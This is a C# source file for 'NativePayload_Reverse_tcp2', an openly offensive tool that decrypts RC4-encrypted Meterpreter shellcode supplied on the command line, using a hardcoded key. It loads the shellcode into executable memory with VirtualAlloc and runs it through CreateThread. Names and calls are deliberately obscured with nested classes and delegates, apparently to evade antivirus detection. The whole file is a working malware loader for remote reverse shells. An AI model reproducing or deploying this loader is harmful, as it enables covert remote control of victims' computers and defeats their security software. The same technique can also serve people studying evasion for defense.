using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;

namespace NativePayload_Reverse_tcp2
{
    public static class Hide 
    {
        public class code 
        {
            public static class a 
            {
		/// this is encryption key ;)  
               public static byte[] _j_ = { 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 };
               public static byte[] bt;
               public static byte[] ftp;


            }
            public class b 
            {
                public static byte cr;
                public static UInt32 funcAddr;
                public class _classs 
                {
                    public static string pay_;
                    [DllImport("kernel32")]
                    public static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
                    [DllImport("kernel32")]
                    public static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);
                    [DllImport("kernel32")]
                    public static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
                    [DllImport("kernel32")]
                    public static extern bool CloseHandle(IntPtr handle);
                    [DllImport("kernel32")]
                    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
                }
            }
        }
        public class hide2 
        {
            public static byte[] EncryptInitalize(byte[] key)
            {
                S ss = Swap;
                byte[] s = Enumerable.Range(0, 256)
                  .Select(i => (byte)i)
                  .ToArray();

                for (int i = 0, j = 0; i < 256; i++)
                {
                    j = (j + key[i % key.Length] + s[i]) & 255;

                    ss(s, i, j);
                }

                return s;
            }
            public static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
            {
                byte[] s = EncryptInitalize(key);

                int i = 0;
                int j = 0;

                return data.Select((b) =>
                {
                    i = (i + 1) & 255;
                    j = (j + s[i]) & 255;

                    Swap(s, i, j);

                    return (byte)(b ^ s[(s[i] + s[j]) & 255]);
                });
            }
            public static void Swap(byte[] s, int i, int j)
            {
                byte c = s[i];

                s[i] = s[j];
                s[j] = c;
            }
            public class hide3
            {
                public static UInt32 MMC = 0x1000;
                public static UInt32 PERE = 0x40;
                public class ops 
                {
                    public static IntPtr ht = IntPtr.Zero;
                    public static UInt32 ti = 0;
                    public static IntPtr pi = IntPtr.Zero;
                    public uint f = 0xFFFFFFFF;
                }
            }
        }
       
        //private static UInt32 PAGE_EXECUTE_READWRITE = 0x80;

        public static byte[] Decrypt(byte[] key, byte[] data)
        {
            EO eatme = hide2.EncryptOutput;
           //return EncryptOutput(key, data).ToArray();
            return eatme(key, data).ToArray();
        }
      
        
        public delegate void S(byte[] s, int i, int j);
        public delegate IEnumerable<byte> EO(byte[] key, IEnumerable<byte> data);
        public delegate byte[] E(byte[] key);
        public delegate byte[] D(byte[] key, byte[] data);
      
    }
    class Program
    {
        public delegate UInt32 V(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        public delegate IntPtr CT(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        public delegate UInt32 W(IntPtr hHandle, UInt32 dwMilliseconds);
        
        static void Main(string[] args)
        {
 	    Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_Reverse_tcp2 , Payload Decryption tool for Meterpreter Payloads (v2) ");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Published by Damon Mohammadbagher , Dec 2016");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.WriteLine();

            Hide.D de = Hide.Decrypt;
            V v = Hide.code.b._classs.VirtualAlloc;
            CT ct = Hide.code.b._classs.CreateThread;
            W w = Hide.code.b._classs.WaitForSingleObject;                                  
            try
            {
               // string Payload_Encrypted;
                if (args != null) { Hide.code.b._classs.pay_ = args[0].ToString(); }
                else { Hide.code.b._classs.pay_ = "ops"; }
                string[] Payload_Encrypted_Without_delimiterChar = Hide.code.b._classs.pay_.Split(',');
               Hide.code.a.bt = new byte[Payload_Encrypted_Without_delimiterChar.Length];
                for (int i = 0; i < Payload_Encrypted_Without_delimiterChar.Length; i++)
                {
                    Hide.code.b.cr = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());
                    Hide.code.a.bt[i] = Hide.code.b.cr;
                    for (int ii = 0; ii < i; ii++)
                    {
                        Console.Write(".");
                    }
                }
	/// v1
        //UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
        //MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        //Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
        //IntPtr hThread = IntPtr.Zero;
        //UInt32 threadId = 0;
        //IntPtr pinfo = IntPtr.Zero;
        //// execute native code
        //hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
        //WaitForSingleObject(hThread, 0xFFFFFFFF);

		/// v2
                Hide.code.a.ftp = de(Hide.code.a._j_, Hide.code.a.bt);
                Console.WriteLine(" Bingo ;)");
                Hide.code.b.funcAddr = v(0, (UInt32)Hide.code.a.ftp.Length, Hide.hide2.hide3.MMC, Hide.hide2.hide3.PERE);
                Marshal.Copy(Hide.code.a.ftp, 0, (IntPtr)(Hide.code.b.funcAddr), Hide.code.a.ftp.Length);
                Hide.hide2.hide3.ops.ht = ct(0, 0, Hide.code.b.funcAddr, Hide.hide2.hide3.ops.pi, 0, ref Hide.hide2.hide3.ops.ti);
                Hide.hide2.hide3.ops f = new Hide.hide2.hide3.ops();
                for (int i = 0; i < 377; i++)
                {
                    if (i == 373) 
                    {
                        w(Hide.hide2.hide3.ops.ht, f.f);
                       
                        break;
                    }

                }
                          
            }
            catch (Exception e )
            {
                Console.WriteLine(e.Message);
                
            }
                       
        }
      
    }
}
